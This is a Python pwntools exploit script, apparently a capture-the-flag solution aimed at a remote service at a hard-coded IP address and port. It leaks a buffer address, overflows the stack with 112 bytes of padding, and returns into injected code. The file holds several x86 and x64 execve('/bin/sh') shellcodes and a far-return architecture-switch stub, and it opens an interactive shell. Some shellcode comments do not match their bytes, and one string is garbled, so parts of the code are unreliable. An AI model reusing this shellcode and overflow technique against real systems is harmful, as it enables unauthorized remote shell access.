#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11002

yuan = remote(host,port)
yuan.recvuntil('x')
ad = yuan.recvuntil('\n')
buf_addr = int(ad , 16)
buf_half = int(ad[8:],16)

main = 0x40064d
pop_rdi = 0x4008a3
ret = '\xc3'
retf = '\xcb'
push_0xb = 'j\x0b'
push_0x32 = 'j2'
mov_rax_0x3b = 'H��;\x00\x00\x00'

flag = ''
#2f62696e2f2f6c73

s = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
s86 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

m = '\x48\xbb'+'\x33'+'\x00'*7+'\x53'+'\x48\xbb'+p64(buf_addr+0x18)+'\x53'+'\x48\xcb'+ret

x64_shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
x32_shellcode =  "\x6a\x04"                      #/* push   0xb */
x32_shellcode += "\x58"                          #/* pop    eax */
x32_shellcode += "\x31\xf6"                      #/* xor    esi,esi */
x32_shellcode += "\x56"                          #/* push   esi */
x32_shellcode += "\x68\x2f\x2f\x73\x68"          #/* push   0x68732f2f */
x32_shellcode += "\x68\x2f\x62\x69\x6e"          #/* push   0x6e69622f */
x32_shellcode += "\x89\xe3"                      #/* mov    ebx,esp */
x32_shellcode += "\x31\xc9"                      #/* xor    ecx,ecx */
x32_shellcode += "\x89\xca"                      #/* mov    edx,ecx */
x32_shellcode += "\xcd\x80"                      #/* int    0x80 */


shellcode = m
payload = shellcode


p = payload
p += 'a' * (112 - len(payload))
p += 'RBBBBBBP'
p += p64(buf_addr)
#p += p64(main)
p += p64(main)
#p += p16(0x33)
#p += p64(buf_addr)
#p += p16(0x23)
#p += p64(main)

yuan.sendline(p)

yuan.interactive()
